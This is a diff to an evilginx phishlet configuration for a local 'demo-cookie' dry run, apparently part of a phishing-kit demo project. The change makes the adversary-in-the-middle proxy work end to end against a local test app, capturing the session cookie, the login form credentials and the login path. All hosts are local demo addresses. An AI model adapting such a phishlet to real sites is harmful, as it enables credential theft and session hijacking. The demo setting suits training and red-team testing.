@@ -1,26 +1,44 @@
 # =============================================================================
-# demo-cookie — cookie-session dry-run against demos/cookie
+# demo-cookie — working cookie-session AiTM dry-run against demos/cookie
 # =============================================================================
 #
-# Upstream mock:  http://127.0.0.1:9080  (make demo-cookie)
-# Dry-run domain: demo-cookie.local.phishkit
+# This phishlet is wired so the shipped demo can actually proxy and capture a
+# session end to end — the previous version pointed its upstream at the lure
+# host itself, so evilginx dialed its own hostname and looped (audit C1.4).
 #
-# Auth shape: POST /login (form) → Set-Cookie: session=… → /dashboard
+# Two distinct hosts are required (this is the whole point of an AiTM proxy):
+#
+#   Lure host (what the "victim" opens, served by evilginx)
+#       demo-cookie.local.phishkit        -> 127.0.0.1  (evilginx :443)
+#
+#   Upstream host (the real app evilginx proxies to, over HTTPS)
+#       app.cookie-demo.test              -> 127.0.0.2  (make demo-cookie-tls)
+#
+# /etc/hosts (both lines):
+#   127.0.0.1   demo-cookie.local.phishkit
+#   127.0.0.2   app.cookie-demo.test
+#
+# Start the HTTPS upstream first, then launch the lure:
+#   make demo-cookie-tls          # serves the cookie app over TLS on 127.0.0.2:443
+#   # then Start + get lure in the desktop app / CLI with phishlet demo-cookie
+#
+# Auth shape: POST /login (form) -> Set-Cookie: session=... -> /dashboard
 # Test creds: demo@phishkit.local / demo-password
 #
-# Note: the mock speaks HTTP on :9080. For a full evilginx proxy dry-run you
-# still need a reachable HTTPS upstream (or tunnel the mock). This phishlet is
-# the capture-surface template and validates cleanly; exercise the mock directly
-# or via the desktop Target notes in demos/cookie/.
+# See docs/guide/walkthrough.md ("AiTM demo end to end") for the full run,
+# including the setcap/sudo privileged-port story.
 # =============================================================================
 
 min_ver: '3.0.0'
 
+# phish host  {phish_sub}.{dry-run domain}  ->  orig host  {orig_sub}.{domain}
+#   ''.demo-cookie.local.phishkit  ->  app.cookie-demo.test
 proxy_hosts:
-  - {phish_sub: '', orig_sub: '', domain: 'demo-cookie.local.phishkit', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: '', orig_sub: 'app', domain: 'cookie-demo.test', session: true, is_landing: true, auto_filter: true}
 
+# Session cookie the upstream sets (host-only on app.cookie-demo.test).
 auth_tokens:
-  - domain: '.demo-cookie.local.phishkit'
+  - domain: 'app.cookie-demo.test'
     keys:
       - 'session'
       - 'access_token,opt'
@@ -38,5 +56,5 @@ credentials:
     type: 'post'
 
 login:
-  domain: 'demo-cookie.local.phishkit'
+  domain: 'app.cookie-demo.test'
   path: '/login'
